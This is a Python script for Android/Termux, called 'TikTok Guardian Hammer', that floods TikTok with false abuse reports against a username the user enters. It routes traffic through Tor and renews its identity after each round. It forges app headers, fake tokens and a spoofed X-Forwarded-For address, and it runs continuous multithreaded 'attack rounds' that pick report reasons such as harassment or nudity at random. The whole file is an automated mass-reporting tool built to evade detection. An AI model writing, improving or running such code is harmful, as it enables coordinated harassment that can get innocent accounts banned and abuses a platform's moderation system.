#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
TikTok Guardian Hammer v4.3 - Termux Fixed Version (Final Stable)
"""

import os
import subprocess
import time
import socket
import hashlib
import random
import requests
import sys
import signal
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from fake_useragent import UserAgent

# ===== Global Configuration =====
CONFIG = {
    "tor_socks": "socks5h://127.0.0.1:9050",
    "max_threads": 15,
    "requests_per_round": 10,
    "control_port": 9051,
    "control_password": "mySecur3!Pass",
    "torrc_path": "/data/data/com.termux/files/usr/etc/tor/torrc",
    "ip_check_url": "https://api.ipify.org",
    "max_retries": 3,
    "tor_timeout": 120,
    "tor_connection_retries": 5,
    "newnym_wait": 7
}

# ===== Global State =====
current_ip = None
ip_lock = Lock()
tor_process = None

# ===== Signal Handler =====
def signal_handler(sig, frame):
    print("\n[!] Received shutdown signal. Cleaning up...")
    if tor_process:
        tor_process.terminate()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# ===== Dependency Installer =====
def install_dependencies():
    print("[+] Installing dependencies...")
    subprocess.run(["pkg", "install", "-y", "tor", "python"], check=True)
    subprocess.run(["pip3", "install", "--upgrade", "requests", "pysocks", "fake-useragent"], check=True)

# ===== Kill Existing Tor Process =====
def kill_existing_tor():
    try:
        subprocess.run(["pkill", "tor"], check=True)
        print("[+] Existing Tor process terminated")
    except subprocess.CalledProcessError:
        print("[*] No existing Tor process found")

# ===== Tor Configuration =====
def setup_torrc():
    tor_dir = os.path.dirname(CONFIG["torrc_path"])
    os.makedirs(tor_dir, exist_ok=True)

    torrc_content = f"""
ControlPort {CONFIG["control_port"]}
HashedControlPassword {generate_hashed_password(CONFIG["control_password"])}
SocksPort 9050
DataDirectory {tor_dir}/data
Log notice file {tor_dir}/notice.log
""".strip()

    with open(CONFIG["torrc_path"], "w") as f:
        f.write(torrc_content)
    print(f"[+] Torrc configured at {CONFIG['torrc_path']}")

def generate_hashed_password(password: str):
    result = subprocess.run(["tor", "--hash-password", password], capture_output=True, text=True)
    lines = result.stdout.strip().splitlines()
    if not lines:
        print("[!] Failed to hash Tor password.")
        sys.exit(1)
    return lines[-1]

# ===== Start Tor =====
def start_tor_service():
    global tor_process
    kill_existing_tor()

    print("[+] Starting Tor service...")
    tor_process = subprocess.Popen(
        ["tor", "-f", CONFIG["torrc_path"]],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

    time.sleep(5)  # Allow Tor to initialize

    if not verify_tor_connection():
        print("[!] Tor failed to connect. Retrying setup...")
        install_dependencies()
        setup_torrc()
        start_tor_service()

# ===== Verify Tor IP =====
def verify_tor_connection():
    for _ in range(CONFIG["tor_connection_retries"]):
        try:
            session = requests.Session()
            session.proxies = {
                'http': CONFIG["tor_socks"],
                'https': CONFIG["tor_socks"]
            }
            response = session.get(CONFIG["ip_check_url"], timeout=15)

            with ip_lock:
                global current_ip
                if current_ip != response.text:
                    print(f"[+] Tor IP: {response.text}")
                    current_ip = response.text
                    return True
        except Exception as e:
            print(f"[!] Tor check failed: {str(e)}")
            time.sleep(3)
    return False

# ===== Renew Identity =====
def renew_tor_identity():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect(("127.0.0.1", CONFIG["control_port"]))
            s.send(f'AUTHENTICATE "{CONFIG["control_password"]}"\r\n'.encode())
            s.send(b'SIGNAL NEWNYM\r\n')
            time.sleep(CONFIG["newnym_wait"])
            print("[+] Tor circuit renewed")
            return True
    except Exception as e:
        print(f"[!] Identity renewal failed: {str(e)}")
        return False

# ===== Header Generator =====
def generate_tiktok_headers():
    android_version = f"{random.randint(9, 13)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
    return {
        'User-Agent': f'com.zhiliaoapp.musically/2022700030 (Linux; U; Android {android_version}; en_US; Pixel 6; Build/SP2A.220405.004; Cronet/TTNetVersion)',
        'X-Tt-Token': hashlib.sha256(str(random.getrandbits(256)).encode()).hexdigest(),
        'X-SS-Stub': hashlib.md5(os.urandom(32)).hexdigest().upper(),
        'X-Client-Lang': 'en-US',
        'X-Forwarded-For': '.'.join(map(str, (random.randint(1, 255) for _ in range(4)))),
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive'
    }

# ===== Report Request =====
def send_report(target):
    for attempt in range(CONFIG["max_retries"]):
        try:
            with requests.Session() as s:
                s.proxies = {
                    'http': CONFIG["tor_socks"],
                    'https': CONFIG["tor_socks"]
                }
                s.headers.update(generate_tiktok_headers())

                reason = random.choice([
                    "inappropriate", "harassment", "spam", "hate_speech",
                    "dangerous_acts", "nudity", "violence", "false_info"
                ])

                response = s.post(
                    f"https://www.tiktok.com/node/report/reasons_put?user={target}&reason={reason}",
                    timeout=15
                )

                if response.status_code == 200 and "error" not in response.text.lower():
                    print(f"[✓] Report succeeded ({response.status_code})")
                    return True
        except Exception as e:
            print(f"[!] Attempt {attempt + 1} failed: {str(e)}")
            time.sleep(random.uniform(1, 3))
    return False

# ===== One Attack Round =====
def execute_attack_round(target):
    success_count = 0
    with ThreadPoolExecutor(max_workers=CONFIG["max_threads"]) as executor:
        futures = [executor.submit(send_report, target) for _ in range(CONFIG["requests_per_round"])]

        for future in as_completed(futures):
            if future.result():
                success_count += 1

    print(f"[+] Round completed. Success rate: {success_count}/{CONFIG['requests_per_round']}")
    return success_count

# ===== Continuous Execution =====
def launch_continuous_attack(target):
    round_counter = 1
    while True:
        print(f"\n=== Attack Round {round_counter} ===")
        if not verify_tor_connection():
            renew_tor_identity()
            continue

        execute_attack_round(target)

        if not renew_tor_identity():
            print("[!] Restarting Tor service...")
            start_tor_service()

        round_counter += 1
        time.sleep(random.uniform(2, 5))

# ===== Entry Point =====
if __name__ == "__main__":
    if not sys.platform.startswith('linux'):
        sys.exit("[!] Linux/Android only!")

    install_dependencies()
    target = input("[?] Enter target username: ").strip('@')
    print(f"[*] Targeting: @{target}")

    setup_torrc()
    start_tor_service()
    launch_continuous_attack(target)
